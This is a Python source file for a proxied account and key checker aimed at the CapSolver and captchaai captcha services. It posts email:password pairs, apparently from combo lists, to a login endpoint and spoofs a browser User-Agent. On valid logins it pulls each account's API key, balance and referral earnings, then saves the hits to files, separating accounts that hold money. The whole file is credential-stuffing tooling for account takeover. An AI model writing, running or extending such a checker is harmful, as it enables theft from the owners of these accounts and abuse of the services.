import requests, charlogger, json, time, random, threading, typing
from ..util.config import Config

class CapsolverChecker():
    def __init__(self,
                workerNum: str = "001", 
                data: str = None,
                config: Config = Config()
            ) -> None:
        self.config = config
        self.workerNum = workerNum
        self.session = requests.Session()
        self.proxy = self.config.getProxy()
        self.session.proxies = { "http": self.proxy, "https": self.proxy }
        self.session.headers.update({ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" })
        self.logger = self.config.getLogger(workerNum)
        self.mode = self.config.checkerSettings.get("mode")
        self.data = data
        pass

    def start(self) -> None:
        try:
            match self.mode:
                case "KEY":
                    self.checkKey(key=self.data)
                case "ACC":
                    self.checkAcc()
        except Exception as e:
            self.logger.warn(title="ERRROR", data=e)
            self.__init__(self.workerNum, self.data, self.config)
            self.start()

    def checkKey(self, key: str) -> None:
        self.key = key
        body = {
            "clientKey": self.key
        }

        resp = self.session.post("https://api.capsolver.com/getBalance", json=body)
        if resp.status_code == 200:
            if resp.json().get("errorId") == 0:
                self.balance = resp.json().get("balance")
                self.fullCapKey = f"{self.key} | Balance: {self.balance}"
                self.logger.valid(title="VALID", data=self.fullCapKey)
                with open("output/checker/valid_keys.txt", "a") as f:
                    f.write(f"{self.fullCapKey}\n")
                    f.close()
            else:
                self.logger.error(title="ERROR", data=f"Error checking key: {resp.status_code} {resp.text}")
        else:
            self.logger.invalid(title="INVALID", data=self.key)

    def checkAcc(self) -> None:
        self.acc = self.data
        email, password = self.acc.split(":", 1)

        body = {
            "email": email,
            "password": password
        }

        resp = self.session.post("https://backend.captchaai.io/api/v1/passport/login", json=body)
        if resp.status_code == 201:
            self.accessToken = resp.json().get("accessToken")
            self.session.headers.update({ "authorization": f"Bearer {self.accessToken}" })
            self.data = self.collectData()
            self.fullCap = f"{self.acc} | Key: {self.key} | Balance: {self.balance} | Referrals: {self.referrals}"
            self.logger.valid(title="VALID", data=self.fullCap)
            with open("output/checker/valid_accs.txt", "a") as f:
                f.write(f"{self.fullCap}\n")
                f.close()
            if float(self.balance) > 0:
                with open("output/checker/accs_balance.txt", "a") as f:
                    f.write(f"{self.fullCap}\n")
                    f.close()
        else:
            self.logger.invalid(title="INVALID", data=self.acc)

    def collectData(self) -> dict:
        resp = self.session.get("https://backend.captchaai.io/api/v1/users/me")
        self.key = resp.json().get("token")
        self.balance = resp.json().get("balance")

        resp = self.session.get("https://backend.captchaai.io/api/v1/referral/statistic")
        self.referrals = resp.json().get("count")
        self.referralBal = resp.json().get("profit")

        self.balance = self.balance + self.referralBal

        return {
            "key": self.key,
            "balance": self.balance,
            "referrals": self.referrals,
            "referral_bal": self.referralBal
        }